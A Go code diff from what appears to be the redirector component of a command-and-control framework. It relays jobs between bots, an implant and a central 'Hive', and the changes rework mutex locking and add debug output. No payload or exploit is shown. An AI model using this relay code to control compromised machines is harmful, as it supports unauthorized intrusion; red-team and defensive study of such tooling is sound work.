@@ -31,15 +31,17 @@ func connectHive(){
 	//Get Any Jobs from Bots targeting this redirector
 	getHive()
 	
-	//Lock shared Slice
-	jobsToHive.mux.Lock()
-	defer jobsToHive.mux.Unlock()
+	//Extra Debug
+
+	fmt.Println("Finish get hive red...")
 
 	j := 0
+	jobsToHive.mux.Lock()
 	for i,_ := range jobsToHive.Jobs {
 		postHive(jobsToHive.Jobs[i])
 	}
 	jobsToHive.Jobs = jobsToHive.Jobs[:j]
+	jobsToHive.mux.Unlock()
 
 }
 
@@ -72,13 +74,13 @@ func getHive(){
 	}
 
 	//Mutex to avoid Race Conditions
+	
 	jobsToBichito.mux.Lock()
-	defer jobsToBichito.mux.Unlock()
-
     jobsToBichito.Jobs = append(jobsToBichito.Jobs,newJobs...)
+    jobsToBichito.mux.Unlock()
 
-	//Debug
-	requestDump, err2 := httputil.DumpResponse(res, true)
+	//Debug: Hive Get Request
+	requestDump, err2 := httputil.DumpRequest(req, true)
 	if err2 != nil {
   		fmt.Println(err2.Error())
 	}
@@ -88,6 +90,8 @@ func getHive(){
 
 
 func postHive(job *Job){
+
+	fmt.Println("Starting posthive...")
 
 	result := checkTLSignature()
 	if result != "Good"{
@@ -113,15 +117,14 @@ func postHive(job *Job){
 	}
 
 
-	//Debug
-
+	//Debug: Hive Post Request
 	requestDump, err2 := httputil.DumpRequest(req, true)
 	if err2 != nil {
   		fmt.Println(err)
 	}
 	fmt.Println(string(requestDump))
-
     fmt.Println("Body: "+string(bytesRepresentation))
+
 
 }
 
